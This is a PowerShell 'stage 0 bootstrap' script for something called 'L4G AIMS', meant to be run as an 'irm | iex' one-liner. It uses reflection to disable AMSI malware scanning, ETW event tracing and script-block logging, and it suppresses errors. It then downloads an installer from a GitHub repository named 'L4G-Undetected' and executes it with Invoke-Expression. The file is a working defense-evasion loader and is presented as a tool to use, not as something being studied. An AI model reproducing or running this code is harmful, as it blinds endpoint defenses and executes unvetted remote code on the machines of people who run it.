<#
.SYNOPSIS
    L4G AIMS - Stage 0 Bootstrap
.DESCRIPTION
    Minimal bootstrap that fetches and executes the main installer.
    Designed to be the one-liner: irm .../bootstrap.ps1 | iex
#>

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$ErrorActionPreference = 'SilentlyContinue'

# Bypass AMSI/ETW/ScriptBlock
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    $etw = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
    $etw.GetField('m_enabled','NonPublic,Instance').SetValue((gv 'PSDefaultEventProvider').Value,$false)
    $sb = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')
    $sb.GetField('s_logScriptBlock','NonPublic,Static').SetValue($null,$false)
} catch {}

$GITHUB_REPO = "https://raw.githubusercontent.com/L4G-Team/L4G-Undetected/main"
$INSTALLER_URL = "$GITHUB_REPO/installer/install.ps1"

# Fetch and execute main installer
try {
    $installer = Invoke-WebRequest -Uri $INSTALLER_URL -UseBasicParsing -TimeoutSec 30
    Invoke-Expression $installer.Content
} catch {
    Write-Error "Bootstrap failed: $_"
    exit 1
}